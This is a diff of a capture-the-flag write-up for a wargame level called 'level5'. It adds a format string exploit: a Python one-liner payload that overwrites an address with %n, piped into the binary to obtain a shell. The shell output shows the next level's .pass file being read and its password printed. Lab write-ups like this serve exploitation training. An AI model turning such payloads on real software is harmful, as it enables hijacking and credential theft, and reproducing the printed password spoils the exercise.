@@ -33,10 +33,16 @@ OFFSET   TYPE              VALUE
 0x80484a4 <o>:	0x83e58955
 ```
 
-[control EIP with string format exploit (doc)](https://samsclass.info/127/proj/p6a-fs.htm)
+0x80484a4 = 134513828
 
-python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%4\$n%x%n')" > /tmp/test5
+134513828 - 4 = 134513824
 
-python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%256\$x' + '%4\$n')" > /tmp/test5
-
-python -c "print('\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08' + '%1$148x' + '%4\$n' + '%5\$n' + '%6\$n' + '%7\$n')" > /tmp/test5
+```sh
+(python -c "print('\x38\x98\x04\x08%134513824x%4\$n')"; cat) | ./level5
+[...]
+ls: cannot open directory .: Permission denied
+pwd
+/home/user/level5
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
